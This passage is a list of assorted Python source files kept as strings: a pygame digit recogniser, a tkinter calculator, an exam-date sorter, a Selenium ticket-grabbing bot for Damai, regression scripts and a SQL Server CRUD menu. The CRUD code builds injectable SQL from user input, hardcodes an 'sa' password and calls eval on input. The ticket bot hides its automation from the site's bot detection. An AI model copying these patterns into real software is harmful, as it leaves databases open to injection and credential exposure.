pygame.QUIT:\r\n            running = False\r\n        elif event.type == pygame.MOUSEBUTTONDOWN:\r\n            drawing = True\r\n            last_pos = pygame.mouse.get_pos()\r\n        elif event.type == pygame.MOUSEBUTTONUP:\r\n            drawing = False\r\n        elif event.type == pygame.MOUSEMOTION:\r\n            if drawing:\r\n                pos = pygame.mouse.get_pos()\r\n                if last_pos is not None:\r\n                    pygame.draw.line(window, BLACK, last_pos, pos, radius)\r\n                last_pos = pos\r\n    keys = pygame.key.get_pressed()\r\n    if keys[pygame.K_SPACE]:\r\n        window.fill(WHITE)\r\n    if keys[pygame.K_RETURN]:\r\n        img = pygame.surfarray.array3d(window)\r\n        img = np.dot(img[..., :3], [0.2989, 0.5870, 0.1140])\r\n        img = np.expand_dims(img, axis=-1) # add channel dimension\r\n        digit = predict_digit(img)\r\n        display_text(str(digit))\r\n    pygame.display.flip()\r\npygame.quit()\r\n",
    "from tkinter import *\r\nimport ast\r\n\r\nroot = Tk()\r\ni = 0\r\ndef getNumber(num):\r\n    global i\r\n    display.insert(i, num)\r\n    i += 1\r\n\r\ndef getOperation(operator):\r\n    global i\r\n    length = len(operator)\r\n    display.insert(i, operator)  \r\n    i += length\r\n\r\ndef clearAll():\r\n    display.delete(0, END)\r\n\r\ndef calculate():\r\n    entireString = display.get()\r\n    try:\r\n        node = ast.parse(entireString , mode= \"eval\")\r\n        result = eval(compile(node, '<string>', 'eval'))\r\n        clearAll()\r\n        display.insert(0,result)\r\n    except Exception:\r\n        clearAll()\r\n        display.insert(0, 'Error')\r\n        \r\ndef undo():\r\n    entireString = display.get()\r\n    if len(entireString):\r\n        newString = entireString[:-1]\r\n        clearAll()\r\n        display.insert(0, newString)\r\n    else:\r\n        clearAll()\r\n        display.insert(0, \"\")\r\n\r\n\r\n\r\ndisplay = Entry(root)\r\ndisplay.grid(row=1, columnspan=6)\r\n\r\nnumbers = [1, 2, 3, 4, 5, 6, 7, 8, 9]\r\ncounter = 0\r\nfor x in range(3):\r\n    for y in range(3):\r\n        buttonText = numbers[counter]\r\n        button = Button(root, text = buttonText,width=2 , height=2, command=lambda text = buttonText:getNumber(text))\r\n        button.grid(row=x+2, column=y)\r\n        counter+= 1\r\n\r\n\r\nbutton = Button(root , text='0', width=2, height=2 , command=lambda :getNumber(0))\r\nbutton.grid(row=5, column=1)\r\n\r\ncount = 0\r\noperations = ['+', '-', '*', '/', '*3.14', '%', '(', '**', ')', '**2']\r\nfor x in range(4):\r\n    for y in range(3):\r\n        if count < len(operations):\r\n            button = Button(root, text= operations[count], width=2, height=2 ,command=lambda text = operations[count]: getOperation(text))\r\n            count += 1\r\n            button.grid(row=x+2, column=y+3)\r\n\r\n\r\nButton(root, text='AC', width=2, height=2, command= clearAll).grid(row=5 , column=0)\r\nButton(root, text='=', width=2, height=2, command=calculate).grid(row=5 , column=2)\r\nButton(root, text=\"<-\", width=2, height=2, command= lambda: undo()).grid(row=5, column=4)\r\n\r\nroot.mainloop()\r\n\r\n",
    "import re\nfrom datetime import datetime\nfrom dateutil.parser import parse\n\n\ndef parse_exam_data(line, default_year=datetime.now().year):\n    \"\"\"\u89e3\u6790\u4e0d\u540c\u683c\u5f0f\u7684\u8003\u8bd5\u4fe1\u606f\uff0c\u8fd4\u56de\u8003\u8bd5\u5f00\u59cb\u65f6\u95f4\u548c\u539f\u59cb\u884c\u5185\u5bb9\u7684\u5143\u7ec4\u3002\"\"\"\n    datetime_patterns = [\n        r'(\\d{4})\u5e74[-/](\\d{2})\u6708[-/](\\d{2})\u65e5[-/](\\d{2})\u65f6',\n        r'(\\d{4})[-/.](\\d{2})[-/.](\\d{2})[ T](\\d{2}):(\\d{2})',\n        r'(\\d{4})[-/.](\\d{2})[-/.](\\d{2})',\n        r'(\\d{2})[-/.](\\d{2})',\n        r'(\\d{1,2}):(\\d{2}) (AM|PM) (\\d{1,2})[-/.](\\d{2})[-/.](\\d{4})',\n        r'(\\d{2})(\\d{2})',\n        r'(\\d{4})(\\d{2})(\\d{2})'  # YYYYMMDD\u683c\u5f0f\n    ]\n\n    # \u9884\u7f16\u8bd1\u6b63\u5219\u8868\u8fbe\u5f0f\u4ee5\u63d0\u9ad8\u6027\u80fd\n    compiled_patterns = [re.compile(pattern) for pattern in datetime_patterns]\n\n    for pattern in compiled_patterns:\n        match = pattern.search(line)\n        if match:\n            groups = match.groups()\n            try:\n                date_str = construct_date_str(groups, pattern, default_year)\n                start_time = parse(date_str)\n                formatted_date = start_time.strftime('%Y-%m-%d %H:%M:%S')\n                revised_line = f\"{formatted_date} {line.strip()}\\n\"\n                return start_time, revised_line\n            except (ValueError, IndexError):\n                continue  # \u5728\u89e3\u6790\u5931\u8d25\u65f6\u7ee7\u7eed\u5c1d\u8bd5\u5176\u4ed6\u683c\u5f0f\n    return None, line\n\n\ndef construct_date_str(groups, pattern, default_year):\n    \"\"\"\u6839\u636e\u6355\u83b7\u7684\u7ec4\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\u6784\u5efa\u65e5\u671f\u5b57\u7b26\u4e32\u3002\"\"\"\n    if '\u5e74' in pattern.pattern or any(x in pattern.pattern for x in ['/', '-', '.']):\n        hour = groups[3] if len(groups) > 3 else '00'\n        return f\"{groups[0]}-{groups[1]}-{groups[2]} {hour}:00:00\"\n    elif 'AM' in pattern.pattern or 'PM' in pattern.pattern:\n        return f\"{groups[5]}-{groups[3]}-{groups[4]} {groups[0]}:{groups[1]} {groups[2]}\"\n    elif len(groups) == 2:\n        return f\"{default_year}-{groups[0]}-{groups[1]} 00:00:00\"\n    elif len(groups) == 3:\n        return f\"{groups[0]}-{groups[1]}-{groups[2]} 00:00:00\"\n    return groups[0]\n\n\ndef read_and_sort_exams(filename):\n    \"\"\" \u8bfb\u53d6\u548c\u6392\u5e8f\u8003\u8bd5\u6570\u636e\u6587\u4ef6 \"\"\"\n    with open(filename, 'r', encoding='utf-8') as file:\n        exams = [parse_exam_data(line) for line in file if line.strip()]\n        exams = [exam for exam in exams if exam[0] is not None]\n        exams.sort(key=lambda x: x[0])  # \u6839\u636e\u65e5\u671f\u6392\u5e8f\n    return [exam[1] for exam in exams]\n\n\ndef write_sorted_exams(filename, sorted_exams):\n    \"\"\" \u5c06\u6392\u5e8f\u540e\u7684\u8003\u8bd5\u4fe1\u606f\u5199\u56de\u6587\u4ef6 \"\"\"\n    with open(filename, 'w', encoding='utf-8') as file:\n        file.writelines(sorted_exams)\n\n\n# \u793a\u4f8b\u7528\u6cd5\uff1a\nsource_filename = 'ori_exam_data.txt'\nfilename = 'exam_data.txt'\n\n# \u8bfb\u53d6\u548c\u6392\u5e8f\u8003\u8bd5\u4fe1\u606f\nsorted_exams = read_and_sort_exams(source_filename)\n\n# \u5199\u56de\u6392\u5e8f\u540e\u7684\u8003\u8bd5\u4fe1\u606f\u5230\u6587\u4ef6\nwrite_sorted_exams(filename, sorted_exams)\n",
    "# coding: utf-8\nfrom json import loads\nfrom time import sleep, time\nfrom pickle import dump, load\nfrom os.path import exists\nfrom selenium import webdriver\nfrom selenium.webdriver.remote.webelement import WebElement\nfrom selenium.common import exceptions\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilities\n\n\nclass Concert(object):\n    def __init__(self, date, session, price, real_name, nick_name, ticket_num, viewer_person, damai_url, target_url, driver_path):\n        self.date = date  # \u65e5\u671f\u5e8f\u53f7\n        self.session = session  # \u573a\u6b21\u5e8f\u53f7\u4f18\u5148\u7ea7\n        self.price = price  # \u7968\u4ef7\u5e8f\u53f7\u4f18\u5148\u7ea7\n        self.real_name = real_name  # \u5b9e\u540d\u8005\u5e8f\u53f7\n        self.status = 0  # \u72b6\u6001\u6807\u8bb0\n        self.time_start = 0  # \u5f00\u59cb\u65f6\u95f4\n        self.time_end = 0  # \u7ed3\u675f\u65f6\u95f4\n        self.num = 0  # \u5c1d\u8bd5\u6b21\u6570\n        self.ticket_num = ticket_num  # \u8d2d\u4e70\u7968\u6570\n        self.viewer_person = viewer_person  # \u89c2\u5f71\u4eba\u5e8f\u53f7\u4f18\u5148\u7ea7\n        self.nick_name = nick_name  # \u7528\u6237\u6635\u79f0\n        self.damai_url = damai_url  # \u5927\u9ea6\u7f51\u5b98\u7f51\u7f51\u5740\n        self.target_url = target_url  # \u76ee\u6807\u8d2d\u7968\u7f51\u5740\n        self.driver_path = driver_path  # \u6d4f\u89c8\u5668\u9a71\u52a8\u5730\u5740\n        self.driver = None\n\n    def isClassPresent(self, item, name, ret=False):\n        try:\n            result = item.find_element(by=By.CLASS_NAME, value=name)\n            if ret:\n                return result\n            else:\n                return True\n        except:\n            return False\n\n    # \u83b7\u53d6\u8d26\u53f7\u7684cookie\u4fe1\u606f\n    def get_cookie(self):\n        self.driver.get(self.damai_url)\n        print(u\"###\u8bf7\u70b9\u51fb\u767b\u5f55###\")\n        self.driver.find_element(by=By.CLASS_NAME, value='login-user').click()\n        while self.driver.title.find('\u5927\u9ea6\u7f51-\u5168\u7403\u6f14\u51fa\u8d5b\u4e8b\u5b98\u65b9\u8d2d\u7968\u5e73\u53f0') != -1:  # \u7b49\u5f85\u7f51\u9875\u52a0\u8f7d\u5b8c\u6210\n            sleep(1)\n        print(u\"###\u8bf7\u626b\u7801\u767b\u5f55###\")\n        while self.driver.title == '\u5927\u9ea6\u767b\u5f55':  # \u7b49\u5f85\u626b\u7801\u5b8c\u6210\n            sleep(1)\n        dump(self.driver.get_cookies(), open(\"cookies.pkl\", \"wb\"))\n        print(u\"###Cookie\u4fdd\u5b58\u6210\u529f###\")\n\n    def set_cookie(self):\n        try:\n            cookies = load(open(\"cookies.pkl\", \"rb\"))  # \u8f7d\u5165cookie\n            for cookie in cookies:\n                cookie_dict = {\n                    'domain': '.damai.cn',  # \u5fc5\u987b\u6709\uff0c\u4e0d\u7136\u5c31\u662f\u5047\u767b\u5f55\n                    'name': cookie.get('name'),\n                    'value': cookie.get('value'),\n                    \"expires\": \"\",\n                    'path': '/',\n                    'httpOnly': False,\n                    'HostOnly': False,\n                    'Secure': False}\n                self.driver.add_cookie(cookie_dict)\n            print(u'###\u8f7d\u5165Cookie###')\n        except Exception as e:\n            print(e)\n\n    def login(self):\n        print(u'###\u5f00\u59cb\u767b\u5f55###')\n        self.driver.get(self.target_url)\n        WebDriverWait(self.driver, 10, 0.1).until(EC.title_contains('\u5546\u54c1\u8be6\u60c5'))\n        self.set_cookie()\n\n    def enter_concert(self):\n        print(u'###\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8fdb\u5165\u5927\u9ea6\u7f51###')\n        if not exists('cookies.pkl'):   # \u5982\u679c\u4e0d\u5b58\u5728cookie.pkl,\u5c31\u83b7\u53d6\u4e00\u4e0b\n            print(self.driver_path)\n            self.driver = webdriver.Chrome()\n            self.get_cookie()\n            print(u'###\u6210\u529f\u83b7\u53d6Cookie\uff0c\u91cd\u542f\u6d4f\u89c8\u5668###')\n            self.driver.quit()\n\n        options = webdriver.ChromeOptions()\n        # \u7981\u6b62\u56fe\u7247\u3001js\u3001css\u52a0\u8f7d\n        prefs = {\"profile.managed_default_content_settings.images\": 2,\n                 \"profile.managed_default_content_settings.javascript\": 1,\n                 'permissions.default.stylesheet': 2}\n        mobile_emulation = {\"deviceName\": \"iPhone 14 Pro Max\"}\n        options.add_experimental_option(\"prefs\", prefs)\n        options.add_experimental_option(\"mobileEmulation\", mobile_emulation)\n        # \u5c31\u662f\u8fd9\u4e00\u884c\u544a\u8bc9chrome\u53bb\u6389\u4e86webdriver\u75d5\u8ff9\uff0c\u4ee4navigator.webdriver=false\uff0c\u6781\u5176\u5173\u952e\n        options.add_argument(\"--disable-blink-features=AutomationControlled\")\n\n        # \u66f4\u6362\u7b49\u5f85\u7b56\u7565\u4e3a\u4e0d\u7b49\u5f85\u6d4f\u89c8\u5668\u52a0\u8f7d\u5b8c\u5168\u5c31\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c\n        # capa = DesiredCapabilities.CHROME\n        # # normal, eager, none\n        # capa[\"pageLoadStrategy\"] = \"eager\"\n        # options.add_experimental_option(\"page_load_strategy\", \"eager\")\n        options.page_load_strategy = \"eager\"\n        self.driver = webdriver.Chrome(\n            options=options, )\n        # \u767b\u5f55\u5230\u5177\u4f53\u62a2\u8d2d\u9875\u9762\n        self.login()\n        self.driver.refresh()\n        # try:\n        #     # \u7b49\u5f85nickname\u51fa\u73b0\n        #     locator = (By.XPATH, \"/html/body/div[1]/div/div[3]/div[1]/a[2]/div\")\n        #     WebDriverWait(self.driver, 5, 0.3).until(EC.text_to_be_present_in_element(locator, self.nick_name))\n        #     self.status = 1\n        #     print(u\"###\u767b\u5f55\u6210\u529f###\")\n        #     self.time_start = time()\n        # except:\n        #     self.status = 0\n        #     self.driver.quit()\n        #     raise Exception(u\"***\u9519\u8bef\uff1a\u767b\u5f55\u5931\u8d25,\u8bf7\u5220\u9664cookie\u540e\u91cd\u8bd5***\")\n\n    def click_util(self, btn, locator):\n        while True:\n            btn.click()\n            try:\n                return WebDriverWait(self.driver, 1, 0.1).until(EC.presence_of_element_located(locator))\n            except:\n                continue\n\n    # \u5b9e\u73b0\u8d2d\u4e70\u51fd\u6570\n\n    def choose_ticket(",
    "from getdata import get_data\nfrom processor import get_processed\nfrom backend import Model\nimport pandas as pd\nfrom sklearn.preprocessing import OneHotEncoder, StandardScaler\n\n\nenc = OneHotEncoder(handle_unknown=\"ignore\", sparse_output=False)\n\ntrain_data = pd.read_csv(\"./data-folder/train.csv\")\ntrain_data.drop(columns = [\"Alley\", \"PoolQC\", \"MiscFeature\", \"Fireplaces\", \"MasVnrType\", \"FireplaceQu\", \"Fence\"], inplace=True)\nX_train = train_data.drop(columns = [\"Id\", \"SalePrice\"])\ny_train = train_data[\"SalePrice\"].to_numpy()\n\nprint(X_train.shape)\nenc.fit(X_train)\nX_train = enc.transform(X_train)\nprint(X_train.shape)\n\nscaler = StandardScaler()\nscaler.fit(X_train)\nX_scaled = scaler.transform(X_train)\n\nmodel = Model(X_scaled, y_train, 0.002, 2500)\n\nmodel.fit()\n\ntest_data = pd.read_csv(\"./data-folder/test.csv\")\nids = test_data[\"Id\"]\ntest_data.drop(columns = [\"Alley\", \"PoolQC\", \"MiscFeature\", \"Fireplaces\", \"MasVnrType\", \"FireplaceQu\", \"Fence\"], inplace=True)\nX_test = test_data.drop(columns = [\"Id\"])\n\nX_test = enc.transform(X_test)\nX_test_scaled = scaler.transform(X_test)\n\npreds = model.predict(X_test_scaled)\n\nresult = pd.DataFrame({\n    \"Id\": ids,\n    \"SalePrice\": preds.reshape(-1,)\n    })\n\nresult.to_csv(\"result.csv\", index = False)\n",
    "import pandas as pd\nimport numpy as np\nimport os\nimport sys\nfrom time import sleep\n\nDATA_FILE_PATH = \"./data/data.csv\"\nPARAMS_FILE_PATH = \"./data/params.csv\"\nDEFAULT_THETAS = {'theta0': 0, 'theta1': 0}\n\n\ndef load_thetas():\n    if os.path.isfile(PARAMS_FILE_PATH):\n        return pd.read_csv(PARAMS_FILE_PATH)\n    else:\n        pd.DataFrame(DEFAULT_THETAS, index=[0]).\\\n            to_csv(PARAMS_FILE_PATH, index=False)\n        return pd.DataFrame(DEFAULT_THETAS, index=[0])\n\n\ndef Mean_Squared_Error(theta0, theta1, mileage, price):\n    \"\"\"\n    Calculate the Mean Squared Error (MSE) between predicted price and\n      actual price.\n    \"\"\"\n    mse = ((1 / len(mileage)) *\n           sum(((theta0 + theta1 * mileage) - price) ** 2))\n    return mse\n\n\ndef Mean_Absolute_Error(theta0, theta1, mileage, price):\n    \"\"\"\n    Calculate the Mean Absolute Error (MAE) between predicted price and\n      actual price.\n    \"\"\"\n    mae = (1 / len(mileage)) * sum(abs(theta1 * mileage + theta0 - price))\n    return mae\n\n\ndef Mean_Percentage_Error(theta0, theta1, mileage, price):\n    \"\"\"\n    Calculate the Mean Percentage Error (MPE) between predicted price and\n      actual price.\n    \"\"\"\n    mpe = (1 / len(mileage)) * \\\n        sum(abs(theta1 * mileage + theta0 - price) / price) * 100\n    return mpe\n\n\ndef calculate_r_squared(data_true, data_pred):\n    \"\"\"\n    Calculate the coefficient of determination (R\u00b2) for a regression model.\n\n    Is a statistical measure that provides an indication of how well the\n      predicted values by a regression model fit the observed real values.\n\n    R\u00b2 = 1: The model explains all variability in the data and fits\n      the observed data perfectly.\n    R\u00b2 = 0: The model explains no variability in the data and does not fit\n      the observed data.\n    \"\"\"\n    # Calculate the mean of the true target variable\n    data_mean = np.mean(data_true)\n\n    # Calculate the total sum of squares (SS_total)\n    ss_total = np.sum((data_true - data_mean) ** 2)\n\n    # Calculate the residual sum of squares (SS_res)\n    ss_res = np.sum((data_true - data_pred) ** 2)\n\n    # Calculate R^2\n    r_squared = 1 - (ss_res / ss_total)\n\n    return r_squared\n\n\ndef precision_stats(df: pd.DataFrame, theta0: float, theta1: float):\n    price = df.loc[:, 'price']\n    mileage = df.loc[:, 'km']\n    mse = Mean_Squared_Error(theta0, theta1, mileage, price)\n    rmse = mse ** (1/2)\n    r2 = calculate_r_squared(price, theta0 + theta1 * mileage)\n    mae = Mean_Absolute_Error(theta0, theta1, mileage, price)\n    mpe = Mean_Percentage_Error(theta0, theta1, mileage, price)\n\n    print(\"\\n=============  PRECISION STADISTICS  ====================\")\n    print(\" MEAN SQUARED ERROR (MSE):                  {:<.5f}\".format(mse))\n    print(\" ROOT MEAN SQUARED ERROR (RMSE):            {:<.5f}\".format(rmse))\n    print(\" R-SQUARED (coefficient of determination):  {:<.5f}\".format(r2))\n    print(\" MEAN ABSOLUTE ERROR (MAE):                 {:<.5f}\".format(mae))\n    print(\" MEAN PERCENTAGE ERROR (MPE):               {:<.5f} %\".format(mpe))\n    print(\"=========================================================\\n\")\n    sleep(5)\n\n\ndef main():\n    try:\n        assert len(sys.argv) == 1, \"\u2757\ufe0f Wrong number of arguments\"\n\n        df = pd.read_csv(DATA_FILE_PATH)\n        assert df is not None, \"\u274c The dataset is wrong\"\n\n        theta = load_thetas()\n        theta0, theta1 = theta.loc[0, ['theta0', 'theta1']]\n\n        assert (theta1 is not None and theta0 is not None), \"thetas not num\"\n        precision_stats(df, theta0, theta1)\n        return\n\n    except AssertionError as msg:\n        print(\"\u274c Error:\", msg)\n\n    except Exception as error:\n        print(\"\u274c Error: \", error)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "#Minimum Absolute Difference In BST\n\n\"\"\"\nGiven a binary search tree having n (n>1) nodes, the task is to find the minimum absolute difference between any two nodes.\n\nExample 1:\n\nInput:\nInput tree\n\nOutput:\n10\nExplanation:\nThere are no two nodes whose absolute difference is smaller than 10.\nExample 2:\n\nInput:\nInput tree\n\nOutput:\n20\nExplanation:\nThere are no two nodes whose absolute difference is smaller than 20.\nYour Task:\nYou don't have to take any input. Just complete the function absolute_diff() , that takes root as input and return minimum absolute difference between any two nodes.\n\nExpected Time Complexity: O(n)\nExpected Auxiliary Space: O(Height of tree)\n\nConstraints:\n2 <= n <= 105\n0 <= Node->data <= 109\n\"\"\"\n\n#Code\n# class Node:\n#     def __init__(self):\n#         self.data = None\n#         self.left = None\n#         self.right = None\n        \nclass Solution:\n    def __init__(self):\n        self.min_diff = float('inf')\n        self.prev = None\n\n    def absolute_diff(self, root):\n        self.inorder_traversal(root)\n        return self.min_diff\n\n    def inorder_traversal(self, root):\n        if root:\n            self.inorder_traversal(root.left)\n            if self.prev is not None:\n                self.min_diff = min(self.min_diff, abs(root.data - self.prev))\n            self.prev = root.data\n            self.inorder_traversal(root.right)\n\n\n",
    "import pyodbc\r\nimport sys\r\ndriver=\"{ODBC Driver 17 for SQL Server}\"\r\nserver=\"DESKTOP-HFCSV7Q\\SQLSERVER2019\"\r\ndatabase=\"\u5ba2\u6236\u8cfc\u8cb7\u8a02\u55ae\"\r\nusername=\"sa\"\r\npassword=\"12345678\"\r\nconn=pyodbc.connect(\"DRIVER=\" + driver\r\n                    + \";SERVER=\" + server\r\n                    + \";DATABASE=\" + database\r\n                    + \";UID=\" + username\r\n                    + \";PWD=\" + password)\r\n\r\n\r\n#\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Staff_Manager():  \r\n print(\"===\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u65b0\u589e\u5ba2\u6236\u8a18\u9304\")\r\n print(\"2.\u4fee\u6539\u5ba2\u6236\u8a18\u9304\")\r\n print(\"3.\u522a\u9664\u5ba2\u6236\u8a18\u9304\")\r\n print(\"4.\u67e5\u8a62\u5ba2\u6236\u8a18\u9304\")\r\n print(\"5.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u5ba2\u6236\u300d\u529f\u80fd\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Staff()\r\n elif n==2:\r\n   Update_Staff()\r\n elif n==3:\r\n   Delete_Staff()   \r\n elif n==4:\r\n   Query_Staff()\r\n elif n==5:\r\n    Main_Menu()\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\ndef Check_Sid(Sid): #\u6aa2\u67e5\u7de8\u865f\u662f\u5426\u5b58\u5728\u65bc\u5ba2\u6236\u8868\u4e2d\u4e4b\u526f\u7a0b\u5f0f\r\n  SQLcmd=\"select * from \u5ba2\u6236\u8868 where \u7de8\u865f='{}'\".format(Sid)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\n\r\ndef Insert_Staff(): #\u65b0\u589e\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)!=None:\r\n    print(\"\u7de8\u865f:{}\u91cd\u8907\u4e86\".format(Sid))\r\n    return\r\n Sname=input(\"\u59d3\u540d\uff1a\")\r\n Tel=input(\"\u96fb\u8a71\uff1a\")\r\n City=input(\"\u57ce\u5e02\uff1a\")\r\n Area=input(\"\u5340\u57df\uff1a\")\r\n SQLcmd=\"INSERT INTO \u5ba2\u6236\u8868 VALUES ('{}','{}','{}','{}','{}')\".format(Sid, Sname,Tel, City, Area)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u65b0\u589e\u5ba2\u6236\u8a18\u9304\uff01\")\r\n Staff_Manager() #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Update_Staff():  #\u4fee\u6539\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)==None:\r\n    print(\"\u67e5\u7121\u6b64\u7de8\u865f:{}\".format(Sid))\r\n    return\r\n Sname=input(\"\u59d3\u540d\uff1a\")\r\n Tel=input(\"\u96fb\u8a71\uff1a\")\r\n City=input(\"\u57ce\u5e02\uff1a\")\r\n Area=input(\"\u5340\u57df\uff1a\")\r\n SQLcmd=\"UPDATE \u5ba2\u6236\u8868 SET \u59d3\u540d='{}',\u96fb\u8a71='{}',\u57ce\u5e02='{}',\u5340\u57df='{} ' Where \u7de8\u865f='{}'\".format(Sname,Tel, City, Area, Sid)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u66f4\u65b0\u5ba2\u6236\u8a18\u9304\uff01\")\r\n Staff_Manager()   #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Delete_Staff(): #\u522a\u9664\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)==None:\r\n    print(\"\u67e5\u7121\u6b64\u7de8\u865f:{}\".format(Sid))\r\n    return\r\n SQLcmd=\"Delete From \u5ba2\u6236\u8868 WHERE \u7de8\u865f='{}'\".format(Sid)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u522a\u9664\u8a18\u9304\u6210\u529f\uff01\")\r\n Staff_Manager()  #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Query_Staff():  #\u67e5\u8a62\u5ba2\u6236\u8a18\u9304\r\n SQLcmd=\"select * from \u5ba2\u6236\u8868\"\r\n Record=conn.execute(SQLcmd)\r\n listStaff=list(Record.fetchall())\r\n print(\"\u7de8\u865f     \u59d3\u540d    \u96fb\u8a71    \u57ce\u5e02    \u5340\u57df\")\r\n for row in listStaff:\r\n    for col in row:\r\n        print(col, end=\"   \")\r\n    print()\r\n Record.close()\r\n Staff_Manager()  #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n \r\n \r\n#\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Product_Manager():  #\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n print(\"===\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u65b0\u589e\u7522\u54c1\u8a18\u9304\")\r\n print(\"2.\u4fee\u6539\u7522\u54c1\u8a18\u9304\")\r\n print(\"3.\u522a\u9664\u7522\u54c1\u8a18\u9304\")\r\n print(\"4.\u67e5\u8a62\u7522\u54c1\u8a18\u9304\")\r\n print(\"5.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u7522\u54c1\u300d\u529f\u80fd\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Product()  #\u65b0\u589e\u7522\u54c1\u8a18\u9304\r\n elif n==2:\r\n   Update_Product()  #\u4fee\u6539\u7522\u54c1\u8a18\u9304\r\n elif n==3:\r\n   Delete_Product()  #\u522a\u9664\u7522\u54c1\u8a18\u9304\r\n elif n==4:\r\n   Query_Product()   #\u67e5\u8a62\u7522\u54c1\u8a18\u9304\r\n elif n==5:\r\n    Main_Menu()      #\u56de\u4e3b\u756b\u9762\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\n\r\ndef CheckProduct_NO(No):\r\n  SQLcmd=\"select * from \u7522\u54c1\u8868 where \u54c1\u865f='{}'\".format(No)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\ndef Insert_Product():   #\u65b0\u589e\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)!=None:\r\n    print(\"\u7de8\u865f:{}\u91cd\u8907\u4e86\".format(No))\r\n    return\r\n Cname=input(\"\u54c1\u540d\uff1a\")\r\n Credits=input(\"\u5b9a\u50f9\uff1a\")\r\n SQLcmd=\"INSERT INTO \u7522\u54c1\u8868 VALUES ('{}','{}','{}')\".format(No,Cname,Credits)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u65b0\u589e\u7522\u54c1\u8a18\u9304\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Update_Product():  #\u4fee\u6539\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)==None:\r\n    print(\"\u67e5\u7121\u6b64\u54c1\u865f:{}\".format(No))\r\n    return\r\n Cname=input(\"\u54c1\u540d\uff1a\")\r\n Credits=input(\"\u5b9a\u50f9\uff1a\")\r\n SQLcmd=\"UPDATE \u7522\u54c1\u8868 SET \u54c1\u540d='{}',\u5b9a\u50f9='{}' Where \u54c1\u865f='{}'\".format(Cname,Credits,No)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u66f4\u65b0\u7522\u54c1\u8a18\u9304\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Delete_Product():  #\u522a\u9664\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)==None:\r\n    print(\"\u67e5\u7121\u6b64\u54c1\u865f:{}\".format(No))\r\n    return\r\n SQLcmd=\"Delete From \u7522\u54c1\u8868 WHERE \u54c1\u865f='{}'\".format(No)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u522a\u9664\u8a18\u9304\u6210\u529f\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Query_Product():  #\u67e5\u8a62\u7522\u54c1\u8a18\u9304\r\n SQLcmd=\"select * from \u7522\u54c1\u8868\"\r\n Record=conn.execute(SQLcmd)\r\n listProduct=list(Record.fetchall())\r\n print(\"\u54c1\u865f    \u54c1\u540d    \u5b9a\u50f9\")\r\n for row in listProduct:\r\n    for col in row:\r\n        print(col, end=\"   \")\r\n    print()\r\n 